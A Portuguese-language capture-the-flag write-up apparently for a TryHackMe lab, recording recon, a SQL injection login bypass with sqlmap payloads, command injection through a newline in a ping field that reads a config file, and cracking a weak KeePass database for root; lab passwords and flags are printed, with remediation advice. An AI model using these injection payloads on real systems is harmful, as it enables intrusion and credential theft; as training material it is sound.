# 🎯 Relatório de Invasão: Silent Monitor

> [!abstract] Resumo 
> **Objetivo:** Enumerar e explorar a plataforma CorpNet's que trabalha com monitoramento de hosts , eventos de log e demais coisas.
> **Vetor de Acesso Inicial:** Conta netops após bypass por sql injection , em seguinte sysadmin via RCE .
> **Vetor de Elevação de Privilégios:** Arquivo .kdbx com senha fraca e presente em wordlist , resultando em recuperação da senha do root.

---

## 🛠️ Ferramentas & Scripts Utilizados
- nmap
- gobuster
- john
- keepass2john
- pspy64
- sqlmap
---

## 🔍 1. Reconhecimento & Mapeamento

### Scan de Portas (Nmap)

> [!example] Output do Nmap -sS

| PORT | SERVICE |
| ---- | ------- |
| 22   | ssh     |
| 5050 | mmcc    |
> [!example] Output do Nmap -sU

| PORT | SERVICE |
| ---- | ------- |
| 68   | dhcpc   |

> [!example] Output do Nmap com -sC e -sV
> 

| PORT | SERVICE/VERSION                                                       | INFOS                                                                                                                                                                        |
| ---- | --------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22   | ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: <br>\|   256 93:09:15:3c:4a:77:c0:0d:d1:1f:41:31:ed:88:56:b7 (ECDSA)<br>\|_  256 99:56:0d:e4:a5:ac:ea:eb:2b:1e:24:d3:60:5e:f9:7b (ED25519)                      |
| 5050 | http    Werkzeug httpd 2.0.2 (Python 3.10.12)                         | http-title: CorpNet \xE2\x80\x94 Network Operations Centre<br>\|_http-server-header: Werkzeug/2.0.2 Python/3.10.12<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne |

> [!info] Análise do Reconhecimento
>Aqui vemos que temos um host rodando um ssh na porta 22 sem vulnerabilidade por versão.
>Um servidor web python rodando na porta 5050 , chamado CorpNet.
### Scan web (Nikto)
```
nikto -h http://10.66.186.204:5050
- Nikto v2.6.0
---------------------------------------------------------------------------
+ Target IP:          10.66.186.204
+ Target Hostname:    10.66.186.204
+ Target Port:        5050
+ Platform:           Windows
+ Start Time:         2026-09-21 12:33:18 (GMT-4)
---------------------------------------------------------------------------
+ Server: Werkzeug/2.0.2 Python/3.10.12
+ ERROR: Failed to check for updates: 403
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
+ [600652] Python/3.10.12 appears to be outdated (current is at least 3.13.1).
+ [999990] OPTIONS: Allowed HTTP Methods: HEAD, GET, OPTIONS .

```
>[!info] Análise do reconhecimento
>Vemos que falta alguns headers de segurança.
>Strict-transport-security -> Impede vazamentos de dados sensível que estiverem na url ao navegar para um link externo , podendo ter esses dados enviados ao servidor de destino.
>Content-Security-Policy->XSS pode ser executado sem restrição caso tenha falhas de injeção html/javascript.
>X-Content-Type-Options -> O navegador tenta adivinha o Mime de arquivos enviados ao servidor , permitindo que um arquivo malicioso possa ser executado no contexto da aplicação.
>Permissions-Policy -> Caso a aplicação seja vulnerável a XSS , os scripts de XSS podem solicitar permissões de câmeras , microfone ou localização.


---

## 🌐 2. Enumeração Web & VHOSTs

`gobuster dir -u http://[IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,log`

> [!quote] Dados e reconhecimento
>

| Path's       | Análise                                                                                                                                                                                                                                      |
| ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| internal/    | Página de login da plataforma com login feito por id de usuário e senha , com presença de sql injection.                                                                                                                                     |
| \|health     | Rota que permitiu RCE via input não validado pelo servidor , somente pelo lado do cliente , assim permitindo alteração pelo brup.                                                                                                            |
| \| dashboard | Possui os logs de auditoria mostrando possíveis 4 usuários , netops , admin , jmartin e svc-mon. Vemos que o netops estava testando a plataforma contra possíveis sql injections na rota de login e injeção de comando na rota HEALTH_CHECK. |
| /            | Página inicial da plataforma que não possui credenciais expostas no page source e nem dados que possam comprometer o sistema.                                                                                                                |
### Conteúdo do Audit Log do /internal/dashboard como netops

|   |   |   |   |
|---|---|---|---|
|2026-05-19 03:16:04|netops|HEALTH_CHECK|127.0.0.1%0awhoami|
|2026-05-19 03:15:52|netops|HEALTH_CHECK|127.0.0.10%awhoami|
|2026-05-19 03:15:39|netops|HEALTH_CHECK|127.0.0.1|
|2026-05-19 03:15:05|netops|LOGIN_OK|—|
|2026-05-19 03:14:38|' OR 1=1#|LOGIN_ERROR|—|
|2026-05-19 03:14:36|' OR 1=1#|LOGIN_ERROR|—|
|2026-05-19 03:14:09|admin' --|LOGIN_FAIL|—|
|2026-01-14 08:03:11|jmartin|LOGIN_OK|—|
|2026-01-14 08:04:02|jmartin|HEALTH_CHECK|10.0.1.4|
|2026-01-14 08:04:28|jmartin|HEALTH_CHECK|10.0.1.7|
|2026-01-14 08:31:55|jmartin|LOGOUT|—|
|2026-01-14 09:17:40|netops|LOGIN_OK|—|
|2026-01-14 09:18:03|netops|HEALTH_CHECK|10.0.0.1|
|2026-01-14 09:19:47|netops|HEALTH_CHECK|10.0.2.12|
|2026-01-14 09:44:22|netops|LOGOUT|—|
|2026-01-14 10:00:01|svc-mon|LOGIN_OK|—|
|2026-01-14 10:00:04|svc-mon|HEALTH_CHECK|10.0.1.1|
|2026-01-14 10:00:07|svc-mon|HEALTH_CHECK|10.0.1.2|
|2026-01-14 10:00:10|svc-mon|HEALTH_CHECK|10.0.1.3|
|2026-01-14 10:00:13|svc-mon|HEALTH_CHECK|10.0.1.4|
|2026-01-14 10:00:16|svc-mon|LOGOUT|—|
|2026-01-14 11:02:38|jmartin|LOGIN_FAIL|—|
|2026-01-14 11:02:51|jmartin|LOGIN_OK|—|
|2026-01-14 11:03:14|jmartin|HEALTH_CHECK|10.0.2.5|
|2026-01-14 11:28:07|jmartin|LOGOUT|—|
|2026-01-15 07:55:30|netops|LOGIN_OK|—|
|2026-01-15 07:56:01|netops|HEALTH_CHECK|10.0.0.254|
### Enumeração do sistema como sysadmin
- sudo -l -> user não tem permissão de sudo
- getcap -> sem binários com getcaps úteis
- Sem binários com SUID que possam nos ajudar
- Sem scripts agendados no crontab , cron.d , ....
- Sem ntfs 
- Sem binários executando como root e que utilizam de outro binário para explorarmos com alteração do PATH
#### pspy64
```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/09/21 20:04:08 CMD: UID=1001  PID=953752 | ./pspy64 
2026/09/21 20:04:08 CMD: UID=0     PID=953733 | 
2026/09/21 20:04:08 CMD: UID=0     PID=953732 | 
2026/09/21 20:04:08 CMD: UID=0     PID=953636 | 
2026/09/21 20:04:08 CMD: UID=0     PID=953538 | 
2026/09/21 20:04:08 CMD: UID=0     PID=953537 | 
2026/09/21 20:04:08 CMD: UID=1001  PID=953397 | -bash 
2026/09/21 20:04:08 CMD: UID=1001  PID=953394 | sshd: sysadmin@pts/0                                                                                                                                                                                                                                                        
2026/09/21 20:04:08 CMD: UID=1001  PID=953307 | (sd-pam) 
2026/09/21 20:04:08 CMD: UID=0     PID=953306 | 
2026/09/21 20:04:08 CMD: UID=0     PID=953305 | 
2026/09/21 20:04:08 CMD: UID=1001  PID=953304 | /lib/systemd/systemd --user 
2026/09/21 20:04:08 CMD: UID=0     PID=953301 | sshd: sysadmin [priv]                                                                                                                                                                                                                                                       
2026/09/21 20:04:08 CMD: UID=0     PID=953129 | /usr/libexec/fwupd/fwupd 
2026/09/21 20:04:08 CMD: UID=33    PID=952648 | /usr/bin/python3 /opt/netops/app.py 
2026/09/21 20:04:08 CMD: UID=0     PID=941154 | 
2026/09/21 20:04:08 CMD: UID=0     PID=733    | 
2026/09/21 20:04:08 CMD: UID=0     PID=706    | /snap/amazon-ssm-agent/13009/ssm-agent-worker 
2026/09/21 20:04:08 CMD: UID=0     PID=700    | sshd: /usr/sbin/sshd -D -o AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys %u %f -o AuthorizedKeysCommandUser ec2-instance-connect [listener] 0 of 10-100 startups                                                                            
2026/09/21 20:04:08 CMD: UID=0     PID=445    | /usr/sbin/ModemManager 
2026/09/21 20:04:08 CMD: UID=0     PID=444    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
2026/09/21 20:04:08 CMD: UID=0     PID=415    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2026/09/21 20:04:08 CMD: UID=0     PID=411    | /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 ttyS0 vt220 
2026/09/21 20:04:08 CMD: UID=0     PID=405    | /usr/libexec/udisks2/udisksd 
2026/09/21 20:04:08 CMD: UID=0     PID=403    | /lib/systemd/systemd-logind 
2026/09/21 20:04:08 CMD: UID=0     PID=402    | /usr/lib/snapd/snapd 
2026/09/21 20:04:08 CMD: UID=0     PID=399    | /snap/amazon-ssm-agent/13009/amazon-ssm-agent 
2026/09/21 20:04:08 CMD: UID=104   PID=398    | /usr/sbin/rsyslogd -n -iNONE 
2026/09/21 20:04:08 CMD: UID=0     PID=397    | /usr/libexec/polkitd --no-debug 
2026/09/21 20:04:08 CMD: UID=0     PID=396    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2026/09/21 20:04:08 CMD: UID=0     PID=393    | /usr/sbin/irqbalance --foreground 
2026/09/21 20:04:08 CMD: UID=103   PID=385    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2026/09/21 20:04:08 CMD: UID=0     PID=384    | /usr/sbin/cron -f -P 
2026/09/21 20:04:08 CMD: UID=0     PID=382    | /usr/sbin/acpid 
2026/09/21 20:04:08 CMD: UID=101   PID=336    | /lib/systemd/systemd-resolved 
2026/09/21 20:04:08 CMD: UID=100   PID=334    | /lib/systemd/systemd-networkd 
2026/09/21 20:04:08 CMD: UID=102   PID=257    | /lib/systemd/systemd-timesyncd 
2026/09/21 20:04:08 CMD: UID=0     PID=214    | 
2026/09/21 20:04:08 CMD: UID=0     PID=210    | 
2026/09/21 20:04:08 CMD: UID=0     PID=178    | /lib/systemd/systemd-udevd 
2026/09/21 20:04:08 CMD: UID=0     PID=165    | /sbin/multipathd -d -s 
2026/09/21 20:04:08 CMD: UID=0     PID=164    | 
2026/09/21 20:04:08 CMD: UID=0     PID=163    | 
2026/09/21 20:04:08 CMD: UID=0     PID=161    | 
2026/09/21 20:04:08 CMD: UID=0     PID=160    | 
2026/09/21 20:04:08 CMD: UID=0     PID=153    | 
2026/09/21 20:04:08 CMD: UID=0     PID=127    | /lib/systemd/systemd-journald 
2026/09/21 20:04:08 CMD: UID=0     PID=86     | 
2026/09/21 20:04:08 CMD: UID=0     PID=85     | 
2026/09/21 20:04:08 CMD: UID=0     PID=84     | 
2026/09/21 20:04:08 CMD: UID=0     PID=71     | 
2026/09/21 20:04:08 CMD: UID=0     PID=69     | 
2026/09/21 20:04:08 CMD: UID=0     PID=61     | 
2026/09/21 20:04:08 CMD: UID=0     PID=60     | 
2026/09/21 20:04:08 CMD: UID=0     PID=59     | 
2026/09/21 20:04:08 CMD: UID=0     PID=56     | 
2026/09/21 20:04:08 CMD: UID=0     PID=55     | 
2026/09/21 20:04:08 CMD: UID=0     PID=54     | 
2026/09/21 20:04:08 CMD: UID=0     PID=53     | 
2026/09/21 20:04:08 CMD: UID=0     PID=52     | 
2026/09/21 20:04:08 CMD: UID=0     PID=51     | 
2026/09/21 20:04:08 CMD: UID=0     PID=50     | 
2026/09/21 20:04:08 CMD: UID=0     PID=49     | 
2026/09/21 20:04:08 CMD: UID=0     PID=48     | 
2026/09/21 20:04:08 CMD: UID=0     PID=47     | 
2026/09/21 20:04:08 CMD: UID=0     PID=46     | 
2026/09/21 20:04:08 CMD: UID=0     PID=45     | 
2026/09/21 20:04:08 CMD: UID=0     PID=44     | 
2026/09/21 20:04:08 CMD: UID=0     PID=43     | 
2026/09/21 20:04:08 CMD: UID=0     PID=42     | 
2026/09/21 20:04:08 CMD: UID=0     PID=41     | 
2026/09/21 20:04:08 CMD: UID=0     PID=40     | 
2026/09/21 20:04:08 CMD: UID=0     PID=39     | 
2026/09/21 20:04:08 CMD: UID=0     PID=38     | 
2026/09/21 20:04:08 CMD: UID=0     PID=37     | 
2026/09/21 20:04:08 CMD: UID=0     PID=36     | 
2026/09/21 20:04:08 CMD: UID=0     PID=35     | 
2026/09/21 20:04:08 CMD: UID=0     PID=34     | 
2026/09/21 20:04:08 CMD: UID=0     PID=32     | 
2026/09/21 20:04:08 CMD: UID=0     PID=31     | 
2026/09/21 20:04:08 CMD: UID=0     PID=29     | 
2026/09/21 20:04:08 CMD: UID=0     PID=27     | 
2026/09/21 20:04:08 CMD: UID=0     PID=26     | 
2026/09/21 20:04:08 CMD: UID=0     PID=25     | 
2026/09/21 20:04:08 CMD: UID=0     PID=23     | 
2026/09/21 20:04:08 CMD: UID=0     PID=22     | 
2026/09/21 20:04:08 CMD: UID=0     PID=21     | 
2026/09/21 20:04:08 CMD: UID=0     PID=20     | 
2026/09/21 20:04:08 CMD: UID=0     PID=19     | 
2026/09/21 20:04:08 CMD: UID=0     PID=18     | 
2026/09/21 20:04:08 CMD: UID=0     PID=17     | 
2026/09/21 20:04:08 CMD: UID=0     PID=16     | 
2026/09/21 20:04:08 CMD: UID=0     PID=15     | 
2026/09/21 20:04:08 CMD: UID=0     PID=14     | 
2026/09/21 20:04:08 CMD: UID=0     PID=13     | 
2026/09/21 20:04:08 CMD: UID=0     PID=12     | 
2026/09/21 20:04:08 CMD: UID=0     PID=10     | 
2026/09/21 20:04:08 CMD: UID=0     PID=7      | 
2026/09/21 20:04:08 CMD: UID=0     PID=6      | 
2026/09/21 20:04:08 CMD: UID=0     PID=5      | 
2026/09/21 20:04:08 CMD: UID=0     PID=4      | 
2026/09/21 20:04:08 CMD: UID=0     PID=3      | 
2026/09/21 20:04:08 CMD: UID=0     PID=2      | 
2026/09/21 20:04:08 CMD: UID=0     PID=1      | /sbin/init 
2026/09/21 20:04:39 CMD: UID=0     PID=953760 | 
2026/09/21 20:05:40 CMD: UID=0     PID=953762 | ps -e -o pid,ppid,state,command 
```
>[!info]Reconhecimento
>Sem nenhum processo rodando que possa nos ajudar .

#### Escalada para root
>[!info] Reconhecimento
>A escalação de privilégio foi feita via .kdbx banco de dados de senha com senha root dentro , na qual crackeamos a senha do .kdbx por ser senha fraca.

---

## ⚡ 3. Exploração & Acesso Inicial (Foothold)

>[!failure] Vulnerabilidade encontrada
>**Título**:Bypass de autenticação via SQL Injection
>**Risk Rating**:DREAD(8+10+10+10+10)/5=9.6
>**Resumo**:Na rota /internal tem um formulário de login que permite bypass no campo de username via SQL injection básica.
>**Background(Contexto adicional)**:SQL injection é uma vulnerabilidade que permite que injetemos entrada no contexto de uma pesquisa sql e ela vire parte da pesquisa ao invés de entrar somente como valor de um campo username ou password na pesquisa sql , permitindo escaparmos caracteres (') e usar --(comentário) para bypassar uma autenticação ou usar de Union para extrair dados do banco através também do escape de caractere.
>**Detalhes Técnicos e Evidências**:
Parameter: username (POST)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause
Payload: username=-7654' OR 5596=5596-- SDGz&password=pass
Type: UNION query
Title: Generic UNION query (NULL) - 3 columns
Payload: username=admin' UNION ALL SELECT NULL,CHAR(113,106,122,122,113)||CHAR(108,72,74,110,105,110,90,81,70,115,90,120,86,102,67,77,108,100,83,116,103,90,75,75,121,99,105,84,119,97,88,111,69,75,107,88,116,87,119,118)||CHAR(113,118,118,112,113),NULL-- Jqeh&password=pass
>**Impacto**:Permite que loguemos como netops que é o primeiro usuário a ser retornado e com ele enumeremos o restante da plataforma.
>**Conselhos e Remediações**: O formulário de login deve aceitar o username e password como parâmetros para uma consulta sql já preparada , e não concatenar string , pois essa consulta sql provavelmente está sendo feita assim ... where username='+username+' and password='+password+';.

>[!failure] Vulnerabilidade encontrada
>**Título**:Filtro de comando sendo feito somente na parte do cliente permitindo RCE
>**Risk Rating**:DREAD(10+10+10+10+10)/5 = 10
>**Resumo**:Um comando ping que executava via ip escolhido pelo usuário filtrava comandos com ";", "&&" , "||" somente na parte do cliente. 
>**Background(Contexto adicional)**: O RCE é uma vulnerabilidade normalmente colocada como 10 de risco porque a partir dessas filtragens mal feitas permite que executemos comandos no servidor de destino assim permitindo que possamos nos apossar dele posteriormente com outras técnicas.
>**Detalhes Técnicos e Evidências**:
>POST /internal/health HTTP/1.1
Host: 10.66.186.204:5050
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.66.186.204:5050
Connection: keep-alive
Referer: http://10.66.186.204:5050/internal/health
Cookie: session=eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0.arF8kQ.ZzfFqX7Anb6n1TnnhtNv4tGDze4
Upgrade-Insecure-Requests: 1
Priority: u=0, i
target=10.14.87.12%0acat+secret.config
Request editada pelo burp e adição de %0a que é o \n que o netops estava testando para ver se era possível no formulário injetar e conseguir RCE , mas esse filtro funciona somente no cliente permitindo que editemos pelo burp.
PING 10.14.87.12 (10.14.87.12) 56(84) bytes of data.
--- 10.14.87.12 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1058ms
netops application config
generated: 2026-01-03
[database]
path    = /opt/netops/netops.db
timeout = 5
[app]
host     = 0.0.0.0
port     = 5050
log_path = /var/log/netops/app.log
[auth]
session_lifetime = 1800
service account used by the backup agent
TODO: migrate to secrets manager before Q2 audit
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!
[smtp]
host = 127.0.0.1
port = 25
from = noc-alerts@corp.internal
Vemos então o cat sendo executado no servidor alvo
>**Impacto**:Qualquer comando pode ser executado no contexto do usuário www-data , permitindo extração de dados , enumeração , escalação de privilégio e reverse shell
>**Conselhos e Remediações**: A filtragem deve ser feita no back end , pois no lado do cliente quando chega no burp podemos mudar o valor e o back end vai aceitar posteriormente pois retiramos a filtragem feita.

>[!failure] Vulnerabilidade encontrada
>**Título**:Arquido kdbx com senha fraca 
>**Risk Rating**:DREAD(10+10+10+10+10)/5=10
>**Resumo**: Arquivo chamado infrastructure dentro de /home/sysadmin/backups possui senha fraca e dentro havia presença da senha da conta root.
>**Background(Contexto adicional)**: KDBX é um tipo de arquivo que se abre com o keepass e nele podemos armazenar credenciais , com isso se um arquivo assim tiver credenciais de usuários privilegiados e ter senha fraca ele se torna um grande alvo podendo fornecer escalação de privilégio e movimentação lateral.
>**Detalhes Técnicos e Evidências**:
>infrastructure.kdbx -> spring
>Senha crackeada via john 
>root -> S3cur3P4ss0nK33p4ss
>**Impacto**: Ao se apossar desse arquivo e crackear sua senha , podemos utilizar o comando su root e como root fazer qualquer coisa no sistema , assim podendo extrair os hashes de senhas de todos os users do sistema .
>**Conselhos e Remediações**:Arquivo kdbx devem possuir senha fortes com extensão mínima de 8 caracteres ou mais , com símbolos , números e letras. 

> [!success] Credenciais Obtidas
> - **Usuário:** sysadmin
> - **Senha / Hash:** S3cur3Backup$Acc3ss!
> - **Flag**:THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}

---

## 🛡️ 4. Movimentação Lateral & Escalação de Privilégios

> [!warning] Meios utilizados e seus resultados
> 

> [!success] Acesso Root / Admin Conquistado
> - **Usuário Admin:** root
> - **Senha / Hash:** S3cur3P4ss0nK33p4ss
> - **Flag de Root/Admin:** THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}

---

## 🔑 Tabela de Credenciais Capturadas

| Serviço / Local      | Usuário  | Senha / Hash         | Origem do Achado                                                            |
| :------------------- | :------- | :------------------- | :-------------------------------------------------------------------------- |
| sysadmin do servidor | sysadmin | S3cur3Backup$Acc3ss! | arquivo secret.config no /var/www/html com user www-data                    |
| root do servidor     | root     | S3cur3P4ss0nK33p4ss  | Arquivo kdbx em /home/sysadmin/backups , que havia senha fraca e crackeável |

---

## 📚 Considerações Técnicas & Cheat Sheet

> [!info] Lições Aprendidas
> 1. Testar o burp para confirmar se o filtro está somente na parte do cliente ou no cliente e servidor para filtragens de campos que podem permitir RCE , LFI ou algo do tipo.
> 2. Arquivos kdbx podem possuir senha fraca , então podemos exfiltrar , usar o keepass2john e tentar quebrar o hash de senha com wordlists conhecidas.

